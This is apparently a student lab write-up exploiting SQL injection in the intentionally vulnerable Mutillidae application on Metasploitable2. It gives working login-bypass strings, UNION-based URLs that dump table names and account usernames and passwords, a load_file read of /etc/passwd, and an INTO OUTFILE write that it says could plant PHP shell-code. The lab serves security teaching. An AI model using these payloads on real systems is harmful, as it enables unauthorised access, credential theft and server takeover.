# EX-08 sqlinjection
Exploiting SQL Injection vulnerability.

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. 
Identify IP address using ifconfig in Metasploitable2


![1](https://github.com/deepikasrinivasans/sqlinjection/assets/119393935/88f5e59a-1068-43cc-ae8b-0ff5a90726b2)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

![2](https://github.com/deepikasrinivasans/sqlinjection/assets/119393935/d683be52-7570-474f-ad36-a20c0cfb6554)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![Screenshot 2023-06-10 213925](https://github.com/praveenst13/sqlinjection/assets/118787793/65d72597-0297-485a-8c57-d335bf885ba6)
Click on the menu Login/Register and register for an account


![Screenshot 2023-06-10 214003](https://github.com/praveenst13/sqlinjection/assets/118787793/dfe4513c-3c0d-43e0-b1e4-ad4baee43b98)

Click on the link “Please register here”
![5](https://github.com/deepikasrinivasans/sqlinjection/assets/119393935/9afc3e91-9fbd-4ef2-a68d-56350aedc136)

Click on “Create Account” to display the following page:
![6](https://github.com/deepikasrinivasans/sqlinjection/assets/119393935/35748669-5d74-4c2c-8de0-679b7c32b4c8)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

Click “Login”. The logged in page will show as below:

![6](https://github.com/deepikasrinivasans/sqlinjection/assets/119393935/de508a77-2d56-470b-b5ab-4e4c3e2d318a)

##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password. 

Click the login button and you will see it enter into the administrator page.
![Screenshot 2023-06-10 223656](https://github.com/praveenst13/sqlinjection/assets/118787793/ac33b189-494b-4a5f-bce2-b840ab35e5fc)


## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. 
we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” 

After logging out, Now choose the menu as shown below:

![7](https://github.com/deepikasrinivasans/sqlinjection/assets/119393935/e7d4c533-d9c7-4401-94fc-53e5bf54fa13)
![8](https://github.com/deepikasrinivasans/sqlinjection/assets/119393935/8ca96cbc-7cb2-4849-b7e0-316bb57260ea)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=sivaram%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![9](https://github.com/deepikasrinivasans/sqlinjection/assets/119393935/d8468d20-db09-4e21-9e9c-711bffa6b4d9)



After adding the order by 6 into the existing url , the following error statement will be obtained:

![10](https://github.com/deepikasrinivasans/sqlinjection/assets/119393935/855956cc-9dec-41b3-baca-d915a916f7d7)


When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.


![11](https://github.com/deepikasrinivasans/sqlinjection/assets/119393935/2f939c85-2053-4472-ad71-3c573eab3de8)

 As it is having 5 columns the query worked fine and it provides the correct result
![12](https://github.com/deepikasrinivasans/sqlinjection/assets/119393935/e75de986-c2f0-4cb6-8f90-a244bae79d71)


Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
![13](https://github.com/deepikasrinivasans/sqlinjection/assets/119393935/9d8f0ce9-bbfb-456f-af11-6b66a35ceea6)


As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![14](https://github.com/deepikasrinivasans/sqlinjection/assets/119393935/2177398e-2cad-49c1-afe8-0fe2e70c89f6)
 Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=sivaram%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![15](https://github.com/deepikasrinivasans/sqlinjection/assets/119393935/ceff5f0a-50e8-4127-97dc-605d05900520)


The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

![16](https://github.com/deepikasrinivasans/sqlinjection/assets/119393935/890848b2-3c6c-4f05-8b8f-87c1b09a7824)

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=sivaram%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
![17](https://github.com/deepikasrinivasans/sqlinjection/assets/119393935/e6ee3a92-333f-48d4-b76d-60ec7f6c4264)

![18](https://github.com/deepikasrinivasans/sqlinjection/assets/119393935/4dc51fe0-e106-4d32-861a-85404a31c03e)


The url once executed will  retrieve table names from the “owasp 10” database.
##Extracting sensitive data such as passwords 

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.


The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=sivaram%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 

![19](https://github.com/deepikasrinivasans/sqlinjection/assets/119393935/e049b661-0089-456b-be1f-a3db29029bb5)


![20](https://github.com/deepikasrinivasans/sqlinjection/assets/119393935/4a437867-9108-4bdb-aa3a-77279e63f203)


Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=sivaram%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
![21](https://github.com/deepikasrinivasans/sqlinjection/assets/119393935/8ae3be33-0474-44b0-9feb-b6d0f424cc66)


![22](https://github.com/deepikasrinivasans/sqlinjection/assets/119393935/2fc5b867-c7f4-47b9-be68-f6352138ad01)





## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=sivaram%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![23](https://github.com/deepikasrinivasans/sqlinjection/assets/119393935/6d09b73c-5969-4879-86d5-591d4e5a9ae8)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).




## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.

